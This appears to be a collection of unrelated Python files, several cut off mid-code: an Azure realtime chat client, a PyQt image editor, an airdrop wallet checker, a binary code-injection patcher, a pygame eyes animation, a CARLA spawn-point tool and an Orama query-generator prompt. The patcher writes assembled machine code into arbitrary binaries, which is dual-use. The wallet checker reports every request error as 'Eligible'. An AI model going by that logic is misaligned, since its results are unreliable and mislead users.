    "import os\nimport sys\nimport json\nimport asyncio\nimport websockets\nimport azure.cognitiveservices.speech as speechsdk\nfrom dotenv import load_dotenv\nimport logging\nimport argparse\n\n# Set up argument parser\nparser = argparse.ArgumentParser(description='Azure Speech Services Chat Application')\nparser.add_argument('--debug', action='store_true', help='Enable debug logging')\n\n# Set up logging\nlogging.basicConfig(\n    level=logging.WARNING,\n    format='%(message)s'\n)\nlogger = logging.getLogger(__name__)\n\nasync def send_message(websocket, message):\n    \"\"\"Send a message to the WebSocket connection.\"\"\"\n    await websocket.send(json.dumps(message))\n    logger.debug(f\"Sent message: {message}\")\n\nasync def receive_message(websocket):\n    \"\"\"Receive a message from the WebSocket connection.\"\"\"\n    response = await websocket.recv()\n    logger.debug(f\"Received message: {response}\")\n    return json.loads(response)\n\nasync def chat_completion(deployment, messages, session_id):\n    \"\"\"Create a chat completion using WebSocket connection.\"\"\"\n    endpoint = os.getenv('AZURE_OPENAI_ENDPOINT')\n    api_key = os.getenv('AZURE_OPENAI_KEY')\n    \n    # Format WebSocket URL to match the realtime endpoint\n    ws_url = f\"wss://{endpoint.replace('https://', '')}?api-version=2024-10-01-preview&deployment={deployment}\"\n    \n    logger.debug(f\"Connecting to WebSocket URL: {ws_url}\")\n    \n    headers = {\n        \"Authorization\": f\"Bearer {api_key}\",\n        \"Content-Type\": \"application/json\",\n        \"api-key\": api_key\n    }\n    \n    async with websockets.connect(ws_url, extra_headers=headers) as websocket:\n        # Wait for session.created event\n        response = await receive_message(websocket)\n        logger.debug(f\"Initial response: {response}\")\n        \n        if response.get(\"type\") != \"session.created\":\n            error_details = response.get(\"error\", {})\n            raise Exception(f\"Expected session.created event, got: {response}\")\n            \n        session_id = response.get(\"session\", {}).get(\"id\")\n        logger.debug(f\"Session ID: {session_id}\")\n        \n        # Add type field to each message\n        content_messages = []\n        for msg in messages:\n            content_messages.append({\n                \"type\": \"input_text\",\n                \"text\": msg[\"content\"]\n            })\n        \n        # Create a conversation item\n        create_item_request = {\n            \"type\": \"conversation.item.create\",\n            \"item\": {\n                \"type\": \"message\",\n                \"role\": \"user\",\n                \"content\": content_messages\n            }\n        }\n        \n        logger.debug(\"Creating conversation item\")\n        await send_message(websocket, create_item_request)\n        response = await receive_message(websocket)\n        logger.debug(f\"Conversation item creation response: {response}\")\n        \n        if \"error\" in response:\n            error_details = response.get(\"error\", {})\n            raise Exception(f\"Conversation item creation error: {error_details}\")\n            \n        # Wait for item.created event\n        if response.get(\"type\") != \"conversation.item.created\":\n            raise Exception(\"Expected conversation.item.created event\")\n            \n        # Create a response\n        response_request = {\n            \"type\": \"response.create\",\n            \"response\": {}\n        }\n        \n        logger.debug(\"Requesting response\")\n        await send_message(websocket, response_request)\n        \n        final_response = None\n        while True:\n            try:\n                response = await receive_message(websocket)\n                logger.debug(f\"Received response: {response}\")\n                \n                if \"error\" in response:\n                    error_details = response.get(\"error\", {})\n                    raise Exception(f\"API Error: {error_details}\")\n                    \n                response_type = response.get(\"type\", \"\")\n                \n                if response_type == \"response.done\":\n                    final_response = response.get(\"response\", {})\n                    break\n                elif response_type == \"error\":\n                    error_details = response.get(\"error\", {})\n                    raise Exception(f\"Stream Error: {error_details}\")\n                    \n            except websockets.exceptions.ConnectionClosed as e:\n                logger.debug(f\"WebSocket connection closed: {str(e)}\")\n                break\n            except Exception as e:\n                logger.error(f\"Error processing response: {str(e)}\")\n                raise\n                \n        return final_response\n\nasync def initialize_session(deployment):\n    \"\"\"Initialize a realtime session.\"\"\"\n    endpoint = os.getenv('AZURE_OPENAI_ENDPOINT')\n    api_key = os.getenv('AZURE_OPENAI_KEY')\n    \n    ws_url = f\"wss://{endpoint.replace('https://', '')}?api-version=2024-10-01-preview&deployment={deployment}\"\n    \n    headers = {\n        \"Authorization\": f\"Bearer {api_key}\",\n        \"Content-Type\": \"applicatio",
    "import sys\nimport cv2\nimport numpy as np\nfrom PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, \n                           QHBoxLayout, QPushButton, QLabel, QFileDialog, \n                            QSlider,QComboBox, QDoubleSpinBox, QMessageBox)\nfrom PyQt5.QtCore import Qt, QPoint, QRect\nfrom PyQt5.QtGui import QImage, QPixmap, QPainter, QPen\nimport matplotlib.pyplot as plt\nfrom matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas\n\nclass ImageLabel(QLabel):\n    def __init__(self, parent=None):\n        super().__init__(parent)\n        self.roi_start = None\n        self.roi_end = None\n        self.roi1 = None\n        self.roi2 = None\n        self.roi3 = None\n        self.current_roi = None\n        self.setMinimumSize(400, 400)\n        self.setText(\"No Image Loaded\")\n        self.is_active = False  # Add flag to track if this viewport is active\n        \n    def mousePressEvent(self, event):\n        if event.button() == Qt.LeftButton and self.pixmap() is not None:\n            self.is_active = True  # Set this viewport as active\n            # Deactivate other viewports\n            if isinstance(self.parent(), QWidget):\n                for sibling in self.parent().findChildren(ImageLabel):\n                    if sibling != self:\n                        sibling.is_active = False\n            self.roi_start = event.pos()\n            self.roi_end = None\n            self.update()\n            \n    def mouseMoveEvent(self, event):\n        if event.buttons() & Qt.LeftButton and self.is_active:\n            self.roi_end = event.pos()\n            self.update()\n            \n    def mouseReleaseEvent(self, event):\n        if event.button() == Qt.LeftButton and self.roi_start and self.roi_end and self.is_active:\n            if not self.roi1:\n                self.roi1 = QRect(self.roi_start, self.roi_end)\n                self.current_roi = 1\n            elif not self.roi2:\n                self.roi2 = QRect(self.roi_start, self.roi_end)\n                self.current_roi = 2\n            elif not self.roi3:\n                self.roi3 = QRect(self.roi_start, self.roi_end)\n                self.current_roi = 3\n            self.update()\n\n    def paintEvent(self, event):\n        super().paintEvent(event)\n        if self.pixmap() is not None:  # Only paint if there's an image\n            painter = QPainter(self)\n            \n            # Draw current selection\n            if self.roi_start and self.roi_end and self.is_active:\n                painter.setPen(QPen(Qt.red, 2))\n                painter.drawRect(QRect(self.roi_start, self.roi_end))\n            \n            # Draw existing ROIs\n            if self.roi1:\n                painter.setPen(QPen(Qt.blue, 2))\n                painter.drawRect(self.roi1)\n                painter.drawText(self.roi1.topLeft(), \"ROI 1\")\n            \n            if self.roi2:\n                painter.setPen(QPen(Qt.green, 2))\n                painter.drawRect(self.roi2)\n                painter.drawText(self.roi2.topLeft(), \"ROI 2\")\n            \n            if self.roi3:\n                painter.setPen(QPen(Qt.yellow, 2))\n                painter.drawRect(self.roi3)\n                painter.drawText(self.roi3.topLeft(), \"ROI 3\")\n\n    def clear_rois(self):\n        self.roi1 = None\n        self.roi2 = None\n        self.roi3 = None\n        self.current_roi = None\n        self.roi_start = None\n        self.roi_end = None\n        self.is_active = False\n        self.update()\n\nclass ImageProcessor(QMainWindow):\n   \n    def __init__(self):\n        super().__init__()\n        self.initUI()\n        self.original_image = None\n        self.current_image = None\n        self.output1_image = None\n        self.output2_image = None\n        self.is_grayscale = False\n        self.active_viewport = None  # Track which viewport is active\n        # Store slider values but don't apply automatically\n        self.brightness_value = 0\n        self.contrast_value = 0\n        \n        # Update stored values when sliders change\n        self.brightness_slider.valueChanged.connect(self.update_brightness_value)\n        self.contrast_slider.valueChanged.connect(self.update_contrast_value)\n\n    def initUI(self):\n        self.setWindowTitle('Image Processing Application')\n        self.setGeometry(100, 100, 1200, 800)\n        \n        # Create main widget and layout\n        main_widget = QWidget()\n        self.setCentralWidget(main_widget)\n        layout = QVBoxLayout()\n        \n        # Create image display area\n        image_layout = QHBoxLayout()\n        \n        # Input viewport\n        self.input_label = ImageLabel()\n        self.input_label.setFixedSize(600, 600)\n        self.input_label.setAlignment(Qt.AlignCenter)\n        self.input_label.mouseDoubleClickEvent = lambda e: self.show_histogram(self.input_label)\n        \n        # Output1 viewport\n        self.output1_label = ImageLabel()\n        self.output1_label.setFixedSize(600, 600)\n        self.output1_label.setAlignment(Qt.AlignCenter)\n      ",
    "import requests\nimport time\nfrom rich.console import Console\nfrom rich.panel import Panel\n\n# Base URL for wallet allocation check\nbase_url = \"https://airdrop.sonic.game/api/allocations\"\n\n# Headers (same as in DevTools)\nheaders = {\n    \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\",\n    \"Accept\": \"*/*\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"Accept-Language\": \"en-US,en;q=0.9\",\n    \"Referer\": \"https://airdrop.sonic.game/\"\n}\n\n# Console for rich output\nconsole = Console()\n\n# Function to display a banner\ndef display_banner():\n    banner = \"\"\"\n\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557    \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2557\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557    \u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551        \u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2554\u255d    \u2588\u2588\u2554\u255d    \u2588\u2588\u2554\u255d\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d   \u2588\u2588\u2588\u2554\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551       \u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d    \u2588\u2588\u2554\u255d    \u2588\u2588\u2554\u255d \n\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551       \u2588\u2588\u2551  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557   \u2588\u2588\u2551     \u2588\u2588\u2551  \n\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d       \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d   \u255a\u2550\u255d     \u255a\u2550\u255d  \n\"\"\"\n    console.print(Panel(banner, title=\"Wallet Checker\", subtitle=\"Version 1.0\", style=\"bold green\"))\n\n# Function to load wallets from file\ndef load_wallets(file_name=\"wallets.txt\"):\n    try:\n        with open(file_name, \"r\") as file:\n            wallets = [\n                line.split(\",\")[0].strip()  # Only keep the part before the comma\n                for line in file.readlines()\n                if line.strip()  # Skip empty lines\n            ]\n            console.print(f\"[bold green]Loaded {len(wallets)} wallets from {file_name}.[/bold green]\")\n            return wallets\n    except FileNotFoundError:\n        console.print(f\"[bold red]{file_name} not found. Please create a file named '{file_name}' with wallet addresses (one per line).[/bold red]\")\n        exit()\n\n# Save results to a file\ndef save_results(wallet, result, file_name=\"results.txt\"):\n    with open(file_name, \"a\", encoding=\"utf-8\") as file:\n        file.write(f\"Wallet: {wallet}, Result: {result}\\n\")\n\n# Check wallet eligibility\ndef check_wallets(wallets):\n    for wallet in wallets:\n        with console.status(f\"[bold cyan]Checking wallet: {wallet}[/bold cyan]\", spinner=\"dots\"):\n            try:\n                response = requests.get(base_url, headers=headers, params={\"wallet\": wallet})\n                if response.status_code == 200:\n                    result = response.json()  # Parse JSON response\n                    if result:  # If the response is not empty\n                        console.print(f\"[green]Wallet: {wallet}, Result: Eligible[/green]\")\n                        save_results(wallet, \"Eligible\")\n                    else:\n                        console.print(f\"[red]Wallet: {wallet}, Result: Not Eligible[/red]\")\n                        save_results(wallet, \"Not Eligible\")\n                else:\n                    console.print(f\"[red]Wallet: {wallet}, Result: Not Eligible[/red]\")\n                    save_results(wallet, \"Not Eligible\")\n            except Exception:\n                # Treat errors as \"Eligible\"\n                console.print(f\"[green]Wallet: {wallet}, Result: Eligible[/green]\")\n                save_results(wallet, \"Eligible\")\n            time.sleep(1)\n\n    console.print(\"[bold green]All wallets checked. Results saved in 'results.txt'.[/bold green]\")\n\n# Main function\nif __name__ == \"__main__\":\n    try:\n        display_banner()  # Display the banner at the start\n        wallets = load_wallets()\n        check_wallets(wallets)\n    except KeyboardInterrupt:\n        console.print(\"\\n[bold red]Program interrupted by user. Exiting gracefully.[/bold red]\")\n",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Thurs Jan  1 12:45:47 2025\r\n\r\n@author: IAN CARTER KULANI\r\n\"\"\"\r\n\r\nfrom colorama import Fore\r\nimport pyfiglet\r\nimport os\r\nfont=pyfiglet.figlet_format(\"BINARY INSTRUMENTATION TOOL \")\r\nprint(Fore.GREEN+font)\r\n\r\n\r\nimport os\r\nimport subprocess\r\n\r\ndef assemble_code(assembly_file):\r\n    \"\"\"\r\n    Assemble the given assembly code file into machine code using nasm.\r\n    \"\"\"\r\n    try:\r\n        # Check if the assembly file exists\r\n        if not os.path.exists(assembly_file):\r\n            print(f\"Assembly file {assembly_file} not found.\")\r\n            return None\r\n\r\n        # Define the output object file\r\n        obj_filename = \"temp.obj\"\r\n\r\n        # Run the nasm assembler using subprocess\r\n        command = [\"nasm\", \"-f\", \"bin\", \"-o\", obj_filename, assembly_file]\r\n        subprocess.run(command, check=True)\r\n\r\n        # Read the generated binary file (machine code)\r\n        with open(obj_filename, 'rb') as obj_file:\r\n            machine_code = obj_file.read()\r\n\r\n        # Clean up temporary object file\r\n        os.remove(obj_filename)\r\n\r\n        return machine_code\r\n\r\n    except Exception as e:\r\n        print(f\"Error assembling code: {e}\")\r\n        return None\r\n\r\n\r\ndef modify_binary_file(binary_file_path, injected_code, offset=0):\r\n    \"\"\"\r\n    Modify the binary file by injecting the assembly (machine) code at the specified offset.\r\n    \"\"\"\r\n    try:\r\n        # Open the original binary file\r\n        with open(binary_file_path, 'rb') as file:\r\n            binary_data = file.read()\r\n\r\n        # Inject the assembly machine code into the binary data at the specified offset\r\n        modified_data = bytearray(binary_data)\r\n\r\n        # Ensure the injected code fits within the modified binary data\r\n        modified_data[offset:offset+len(injected_code)] = injected_code\r\n\r\n        # Write the modified data back to the binary file\r\n        with open(binary_file_path, 'wb') as file:\r\n            file.write(modified_data)\r\n\r\n        print(f\"Binary file {binary_file_path} has been modified successfully.\")\r\n\r\n    except Exception as e:\r\n        print(f\"Error modifying binary file: {e}\")\r\n\r\n\r\ndef main():\r\n    # Ask for the binary file to modify\r\n    binary_file_path = input(\"Enter the path of the binary file you want to modify (e.g., file.bin):\").strip()\r\n\r\n    # Check if the binary file exists\r\n    if not os.path.exists(binary_file_path):\r\n        print(f\"Binary file {binary_file_path} not found.\")\r\n        return\r\n\r\n    # Ask for the assembly file\r\n    assembly_file = input(\"Enter the path of the assembly file (e.g., code.asm):\").strip()\r\n\r\n    # Assemble the code from the assembly file\r\n    injected_code = assemble_code(assembly_file)\r\n\r\n    if injected_code is None:\r\n        print(\"Failed to assemble the assembly code.\")\r\n        return\r\n\r\n    # Ask the user for the injection offset (where the machine code will be inserted)\r\n    try:\r\n        offset = int(input(\"Enter the offset (in bytes) where the code will be injected (default 0): \").strip() or \"0\")\r\n    except ValueError:\r\n        print(\"Invalid input for offset. Using default value 0.\")\r\n        offset = 0\r\n\r\n    # Modify the binary file with the injected machine code\r\n    modify_binary_file(binary_file_path, injected_code, offset)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import pygame\nimport sys\nimport random\n\n# Constants for colors\nBGCOLOR = (0, 0, 0)           # Black background\nMAINCOLOR = (255, 255, 255)   # White drawings\n\n# Mood Types\nDEFAULT = 0\nTIRED = 1\nANGRY = 2\nHAPPY = 3\n\n# Predefined Positions\nN = 1   # North, top center\nNE = 2  # North-east, top right\nE = 3   # East, middle right\nSE = 4  # South-east, bottom right\nS = 5   # South, bottom center\nSW = 6  # South-west, bottom left\nW = 7   # West, middle left\nNW = 8  # North-west, top left\n\nclass RoboEyes:\n    def __init__(self, draw_surface, width=320, height=240, frame_rate=50):\n        \"\"\"\n        Initialize the RoboEyes class.\n\n        :param draw_surface: Pygame surface to draw on.\n        :param width: Screen width in pixels (unrotated).\n        :param height: Screen height in pixels (unrotated).\n        :param frame_rate: Maximum frames per second.\n        \"\"\"\n        self.surface = draw_surface\n        self.screen_width = width\n        self.screen_height = height\n        self.frame_interval = 1000 / frame_rate  # in milliseconds\n        self.fps_timer = pygame.time.get_ticks()\n\n        # Mood and expressions\n        self.tired = False\n        self.angry = False\n        self.happy = False\n        self.curious = False\n        self.cyclops = False\n        self.eyeL_open = False\n        self.eyeR_open = False\n\n        # Eye Geometry\n        self.space_between_default = 10  # Reduced space for larger eyes\n        self.space_between_current = self.space_between_default\n        self.space_between_next = self.space_between_default\n\n        # Left Eye\n        self.eyeLwidth_default = 100   # Increased size proportionally\n        self.eyeLheight_default = 100\n        self.eyeLwidth_current = self.eyeLwidth_default\n        self.eyeLheight_current = 1  # start with closed eye\n        self.eyeLwidth_next = self.eyeLwidth_default\n        self.eyeLheight_next = self.eyeLheight_default\n        self.eyeLheight_offset = 0\n\n        self.eyeLborder_radius_default = 20  # Increased radius for larger eyes\n        self.eyeLborder_radius_current = self.eyeLborder_radius_default\n        self.eyeLborder_radius_next = self.eyeLborder_radius_default\n\n        # Right Eye\n        self.eyeRwidth_default = self.eyeLwidth_default\n        self.eyeRheight_default = self.eyeLheight_default\n        self.eyeRwidth_current = self.eyeRwidth_default\n        self.eyeRheight_current = 1  # start with closed eye\n        self.eyeRwidth_next = self.eyeRwidth_default\n        self.eyeRheight_next = self.eyeRheight_default\n        self.eyeRheight_offset = 0\n\n        self.eyeRborder_radius_default = 20\n        self.eyeRborder_radius_current = self.eyeRborder_radius_default\n        self.eyeRborder_radius_next = self.eyeRborder_radius_default\n\n        # Coordinates\n        self.eyeLx_default = (self.screen_width - (self.eyeLwidth_default + self.space_between_default + self.eyeRwidth_default)) // 2\n        self.eyeLy_default = (self.screen_height - self.eyeLheight_default) // 2\n        self.eyeLx = self.eyeLx_default\n        self.eyeLy = self.eyeLy_default\n        self.eyeLx_next = self.eyeLx\n        self.eyeLy_next = self.eyeLy\n\n        self.eyeRx_default = self.eyeLx + self.eyeLwidth_current + self.space_between_default\n        self.eyeRy_default = self.eyeLy\n        self.eyeRx = self.eyeRx_default\n        self.eyeRy = self.eyeRy_default\n        self.eyeRx_next = self.eyeRx\n        self.eyeRy_next = self.eyeRy\n\n        # Both Eyes\n        self.eyelids_height_max = self.eyeLheight_default // 2\n        self.eyelids_tired_height = 0\n        self.eyelids_tired_height_next = self.eyelids_tired_height\n        self.eyelids_angry_height = 0\n        self.eyelids_angry_height_next = self.eyelids_angry_height\n        self.eyelids_happy_bottom_offset_max = (self.eyeLheight_default // 2) + 6  # Adjusted for larger eyes\n        self.eyelids_happy_bottom_offset = 0\n        self.eyelids_happy_bottom_offset_next = 0\n\n        # Macro Animations\n        self.hFlicker = False\n        self.hFlicker_alternate = False\n        self.hFlicker_amplitude = 4  # Increased amplitude for larger screen\n\n        self.vFlicker = False\n        self.vFlicker_alternate = False\n        self.vFlicker_amplitude = 20  # Increased amplitude for larger screen\n\n        self.autoblinker = False\n        self.blink_interval = 2000  # in milliseconds (2 seconds)\n        self.blink_interval_variation = 4000  # in milliseconds\n        self.blink_timer = pygame.time.get_ticks()\n\n        self.idle = False\n        self.idle_interval = 5000  # in milliseconds (5 seconds)\n        self.idle_interval_variation = 5000  # in milliseconds\n        self.idle_animation_timer = pygame.time.get_ticks()\n\n        self.confused = False\n        self.confused_animation_timer = 0\n        self.confused_animation_duration = 500  # in milliseconds\n        self.confused_toggle = True\n\n        self.laugh = False\n        self.laugh_animation_timer = 0\n        self.laugh_animation_duration = 500  # in milliseconds\n        self.laugh_",
    "#!/usr/bin/env python\n\nimport carla\nimport pygame\nimport json\nimport sys\nimport os\nimport math\n\nclass SpawnPointSelector:\n    def __init__(self):\n        # \u521d\u59cb\u5316Carla\u5ba2\u6237\u7aef\n        self.client = carla.Client('localhost', 2000)\n        self.client.set_timeout(4.0)\n        \n        # \u52a0\u8f7d\u6307\u5b9a\u5730\u56fe\n        self.client.load_world('Town03')\n        self.world = self.client.get_world()\n        self.map = self.world.get_map()\n        \n        # \u83b7\u53d6\u5b98\u65b9\u751f\u6210\u70b9\u548c\u8def\u7f51\u70b9\n        self.spawn_points = self.map.get_spawn_points()\n        self.waypoints = self.map.generate_waypoints(2.0)\n        \n        # \u8ba1\u7b97\u5730\u56fe\u8fb9\u754c\n        self.calculate_map_bounds()\n        \n        # \u521d\u59cb\u5316Pygame\n        pygame.init()\n        self.width = 1280\n        self.height = 960\n        self.screen = pygame.display.set_mode((self.width, self.height))\n        pygame.display.set_caption('Carla Spawn Point Selector - Space to switch mode')\n        \n        # \u8ba1\u7b97\u5408\u9002\u7684\u7f29\u653e\u6bd4\u4f8b\n        self.calculate_scale()\n        \n        # \u5b58\u50a8\u9009\u62e9\u7684\u70b9\n        self.ego_point = None  # \u4e3b\u8f66\u53ea\u80fd\u6709\u4e00\u4e2a\u70b9\n        self.npc_points = []   # NPC\u53ef\u4ee5\u6709\u591a\u4e2a\u70b9\n        self.selecting_ego = True\n        \n        # \u52a0\u8f7d\u5df2\u6709\u7684\u751f\u6210\u70b9\n        self.spawn_points_file = 'spawn_points.json'\n        self.load_spawn_points()\n\n    def load_spawn_points(self):\n        if os.path.exists(self.spawn_points_file):\n            try:\n                with open(self.spawn_points_file, 'r') as f:\n                    data = json.load(f)\n                    self.ego_point = data.get('ego_point')\n                    self.npc_points = data.get('npc_points', [])\n            except:\n                print(\"\u65e0\u6cd5\u52a0\u8f7d\u5df2\u6709\u751f\u6210\u70b9\u6587\u4ef6\")\n\n    def save_spawn_points(self):\n        data = {\n            'ego_point': self.ego_point,\n            'npc_points': self.npc_points,\n            'map_name': self.map.name\n        }\n        with open(self.spawn_points_file, 'w') as f:\n            json.dump(data, f, indent=4)\n        print(f\"\u751f\u6210\u70b9\u5df2\u4fdd\u5b58\u5230 {self.spawn_points_file}\")\n\n    def calculate_map_bounds(self):\n        \"\"\"\u8ba1\u7b97\u5730\u56fe\u8fb9\u754c\"\"\"\n        # \u540c\u65f6\u8003\u8651\u8def\u7f51\u70b9\u548c\u751f\u6210\u70b9\u6765\u8ba1\u7b97\u8fb9\u754c\n        x_coords = ([wp.transform.location.x for wp in self.waypoints] + \n                   [sp.location.x for sp in self.spawn_points])\n        y_coords = ([wp.transform.location.y for wp in self.waypoints] +\n                   [sp.location.y for sp in self.spawn_points])\n        \n        # \u6269\u5927\u8fb9\u754c\u786e\u4fdd\u663e\u793a\u5b8c\u6574\n        margin = 50  # \u7c73\n        self.map_bounds = {\n            'min_x': min(x_coords) - margin,\n            'max_x': max(x_coords) + margin,\n            'min_y': min(y_coords) - margin,\n            'max_y': max(y_coords) + margin\n        }\n        \n    def calculate_scale(self):\n        \"\"\"\u8ba1\u7b97\u5408\u9002\u7684\u7f29\u653e\u6bd4\u4f8b\"\"\"\n        map_width = self.map_bounds['max_x'] - self.map_bounds['min_x']\n        map_height = self.map_bounds['max_y'] - self.map_bounds['min_y']\n        \n        # \u7559\u51fa\u4e00\u4e9b\u8fb9\u8ddd\n        margin = 0.1\n        width_scale = (self.width * (1 - margin)) / map_width\n        height_scale = (self.height * (1 - margin)) / map_height\n        \n        # \u4f7f\u7528\u8f83\u5c0f\u7684\u7f29\u653e\u6bd4\u4f8b\u4ee5\u786e\u4fdd\u5730\u56fe\u5b8c\u5168\u663e\u793a\n        self.scale = min(width_scale, height_scale)\n\n    def world_to_screen(self, location):\n        \"\"\"\u5c06\u4e16\u754c\u5750\u6807\u8f6c\u6362\u4e3a\u5c4f\u5e55\u5750\u6807\"\"\"\n        center_x = (self.map_bounds['min_x'] + self.map_bounds['max_x']) / 2\n        center_y = (self.map_bounds['min_y'] + self.map_bounds['max_y']) / 2\n        \n        # \u8f6c\u6362\u5750\u6807\n        screen_x = self.width/2 + (location.x - center_x) * self.scale\n        screen_y = self.height/2 - (location.y - center_y) * self.scale\n        return (int(screen_x), int(screen_y))\n\n    def screen_to_world(self, screen_pos):\n        \"\"\"\u5c06\u5c4f\u5e55\u5750\u6807\u8f6c\u6362\u4e3a\u4e16\u754c\u5750\u6807\"\"\"\n        center_x = (self.map_bounds['min_x'] + self.map_bounds['max_x']) / 2\n        center_y = (self.map_bounds['min_y'] + self.map_bounds['max_y']) / 2\n        \n        x = center_x + (screen_pos[0] - self.width/2) / self.scale\n        y = center_y - (screen_pos[1] - self.height/2) / self.scale\n        return carla.Location(x=x, y=y, z=0.0)\n\n    def draw(self):\n        self.screen.fill((0, 0, 0))  # \u9ed1\u8272\u80cc\u666f\n        \n        # \u7ed8\u5236\u80cc\u666f\u8def\u7f51\u70b9\uff08\u7070\u8272\u5c0f\u70b9\uff09\n        for wp in self.waypoints:\n            pos = self.world_to_screen(wp.transform.location)\n            pygame.draw.circle(self.screen, (50, 50, 50), pos, 1)\n        \n        # \u7ed8\u5236\u5b98\u65b9\u751f\u6210\u70b9\u548c\u65b9\u5411\uff08\u767d\u8272\uff09\n        for spawn_point in self.spawn_points:\n            pos = self.world_to_screen(spawn_point.location)\n            direction_length = 20\n            angle = math.radians(spawn_point.rotation.yaw)\n            end_pos = (\n                pos[0] + direction_length * math.cos(angle),\n                pos[1] - direction_length * math.sin(angle)\n            )\n            pygame.draw.circle(self.screen, (200, 200, 200), pos, 4)\n            pygame.draw.line(self.screen, (200, 200, 200), pos, end_pos, 2)\n        \n        # \u7ed8\u5236\u4e3b\u8f66\u751f\u6210\u70b9\uff08\u7ea2\u8272\uff09\n        if self.ego_point:\n            loc = carla.Location(x=self.ego_point['x'], y=self.ego_point['y'], z=self.ego_point['z'])\n            pos = self.world_to_screen(loc)\n            angle = math.radians(self.ego_point.get('yaw', 0))\n            end_pos = (\n                pos[0] + direction_length",
    "import os\nimport json\nimport csv\nfrom typing import List\nfrom openai import OpenAI\nfrom json_repair import repair_json\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\n\nTOPICS = [\n    \"computer science\",\n    \"javascript\",\n    \"react\",\n    \"php\",\n    \"java\",\n    \"music\",\n    \"programming\",\n    \"groceries\",\n    \"health\",\n    \"travel\",\n    \"work\",\n    \"education\",\n    \"politics\",\n    \"sports\",\n    \"finance\",\n    \"business\",\n    \"entertainment\",\n    \"lifestyle\",\n    \"fashion\",\n    \"movies\",\n    \"gaming\",\n    \"hardware\",\n    \"animals\",\n    \"vacation\",\n    \"hotels\",\n    \"astronomy\",\n    \"food\",\n    \"technology\",\n    \"medical\",\n    \"outdoor activities\",\n    \"family\",\n]\n\nSYSTEM_PROMPT = \"\"\"\nYou are a tool used to generate synthetic data of Orama queries. Orama is a full-text, vector, and hybrid search engine.\n\nLet me show you what you need to do with some examples.\n\nExample:\n  - Query: `\"What are the red wines that cost less than 20 dollars?\"`\n  - Schema: `{ \"name\": \"string\", \"content\": \"string\", \"price\": \"number\", \"tags\": \"enum[]\" }`\n  - Generated query: `{ \"term\": \"\", \"where\": { \"tags\": { \"containsAll\": [\"red\", \"wine\"] }, \"price\": { \"lt\": 20 } } }`\n\nAnother example:\n  - Query: `\"Show me 5 prosecco wines good for aperitif\"`\n  - Schema: `{ \"name\": \"string\", \"content\": \"string\", \"price\": \"number\", \"tags\": \"enum[]\" }`\n  - Generated query: `{ \"term\": \"prosecco aperitif\", \"limit\": 5 }`\n\nOne last example:\n  - Query: `\"Show me some wine reviews with a score greater than 4.5 and less than 5.0.\"`\n  - Schema: `{ \"title\": \"string\", \"content\": \"string\", \"reviews\": { \"score\": \"number\", \"text\": \"string\" } }]`\n  - Generated query: `{ \"term\": \"\", \"where\": { \"reviews.score\": { \"between\": [4.5, 5.0] } } }`\n\nThe rules to generate the query are:\n\n- Never use an \"embedding\" field in the schema.\n- Every query has a \"term\" field that is a string. It represents the full-text search terms. Can be empty (will match all documents).\n- You can use a \"where\" field that is an object. It represents the filters to apply to the documents. Its keys and values depend on the schema of the database:\n  - If the field is a \"string\", you should not use operators. Example: `{ \"where\": { \"title\": \"champagne\" } }`.\n  - If the field is a \"number\", you can use the following operators: \"gt\", \"gte\", \"lt\", \"lte\", \"eq\", \"between\". Example: `{ \"where\": { \"price\": { \"between\": [20, 100] } } }`. Another example: `{ \"where\": { \"price\": { \"lt\": 20 } } }`.\n  - If the field is an \"enum\", you can use the following operators: \"eq\", \"in\", \"nin\". Example: `{ \"where\": { \"tags\": { \"containsAll\": [\"red\", \"wine\"] } } }`.\n  - If the field is an \"string[]\", it's gonna be just like the \"string\" field, but you can use an array of values. Example: `{ \"where\": { \"title\": [\"champagne\", \"montagne\"] } }`.\n  - If the field is a \"boolean\", you can use the following operators: \"eq\". Example: `{ \"where\": { \"isAvailable\": true } }`. Another example: `{ \"where\": { \"isAvailable\": false } }`.\n  - If the field is a \"enum[]\", you can use the following operators: \"containsAll\". Example: `{ 